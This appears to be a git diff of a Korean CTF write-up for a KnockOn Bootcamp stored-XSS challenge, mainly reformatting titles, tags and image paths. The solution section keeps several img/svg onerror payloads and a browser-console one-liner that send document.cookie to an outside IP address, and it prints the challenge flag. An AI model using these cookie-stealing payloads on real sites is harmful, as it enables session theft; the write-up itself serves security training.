@@ -1,56 +1,32 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 5. Xross Site Scripting revenge"
+title: "KnockOn Bootcamp 2nd - 5. Cross-Site Scripting Revenge"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
-  - DOM based XSS
-last_modified_at: 2024-09-03T10:40:00-05:00
+last_modified_at: 2024-09-04T00:40:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10012/>
 
-![5. Xross Site Scripting revenge 1](/assets/images/writeup/web-hacking/knock-on/5_XSS_1.png)
+![5. Xross Site Scripting revenge 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-xss-1.png)
 
-![5. Xross Site Scripting revenge 2](/assets/images/writeup/web-hacking/knock-on/5_XSS_2.png)
-
-
-|
-
-|
-
-|
+![5. Xross Site Scripting revenge 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-xss-2.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
-- DOM based XSS
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -123,7 +99,7 @@ def view_post(id):
 
     if '127.0.0.1' == request.remote_addr: #if admin bot
         return render_template('post.html', post=post)
-    
+
     if request.method == 'POST':
 
         password = request.form['password']
@@ -194,29 +170,17 @@ if __name__ == '__main__':
     app.run(host="0.0.0.0", port=10006, debug=True)
 ```
 
-|
-
-|
-
-|
-
 ## 분석
 
 ### /write
 
----
-
-![5. Xross Site Scripting revenge 3](/assets/images/writeup/web-hacking/knock-on/5_XSS_3.png)
+![5. Xross Site Scripting revenge 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-xss-3.png)
 
 `/write`에서 제목, 내용, 비밀번호 입력 가능
 
-|
-
-![5. Xross Site Scripting revenge 4](/assets/images/writeup/web-hacking/knock-on/5_XSS_4.png)
+![5. Xross Site Scripting revenge 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-xss-4.png)
 
 `내용`에 스크립트를 입력하면, 스크립트가 동작하지 않고 텍스트 그대로 화면에 나타남
-
-|
 
 ```html
 <input type="hidden" id="image" name="image" value="">
@@ -224,17 +188,9 @@ if __name__ == '__main__':
 
 개발자 도구로 소스 코드를 확인하면 `<input>`태그가 `hidden`으로 숨겨져있음
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### write()
-
----
 
 ```python
 if request.form['image']:
@@ -243,13 +199,7 @@ if request.form['image']:
 
 `image` 라는 이름의 폼의 값이 존재하면 `Post`객체를 생성하고 `image`필드에 사용자가 입력한`request.form['image']` 추가
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 `/write` 에서 글을 작성할 때 `<input>`태그의 `value`를 채워야함
 
@@ -261,15 +211,11 @@ if request.form['image']:
 
 F12를 활용해 숨겨진 `<input>`태그의 `type`을 `hidden`에서 `text`로 변경하면 화면에 입력창이 나타남
 
-|
-
 ```html
 <img src="1" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>
 ```
 
 나타난 `<input>`입력창에 입력하면 됨
-
-|
 
 ```html
 <img src="<img src=" 1"="" onerror="location.href=&quot;http://20.41.120.97:10010/&quot;+document.cookie">
@@ -277,22 +223,13 @@ F12를 활용해 숨겨진 `<input>`태그의 `type`을 `hidden`에서 `text`로
 
 작성된 글의 소스코드를 보면 `src`가 이상하게 입력됐지만, 의도했던 `onerror`트리거는 정상적으로 동작함ㄷㄷ
 
-
-|
-
 ```html
 <svg src="" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>
 ```
 
 다른 태그여도 src속성과 트리거만 존재하면 가능
 
-|
-
-|
-
 ### 방법 2
-
----
 
 ```js
 <input type="text" id="image" name="image" value="">
@@ -318,10 +255,6 @@ javascript를 사용해 `<input>`태그의 `value`속성의 값을 설정
 
 게시글 내용은 중요하지 않음
 
-|
-
-|
-
 ### 결과
 
 ```sh
@@ -336,34 +269,16 @@ Accept-Encoding: gzip, deflate
 
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### console
-
----
 
 ```jsx
 document.getElementById('image').value = `"" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>`
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```bash
 K0{t0day_is_3v3nt_d4y}
 ```
-
-|
-
----
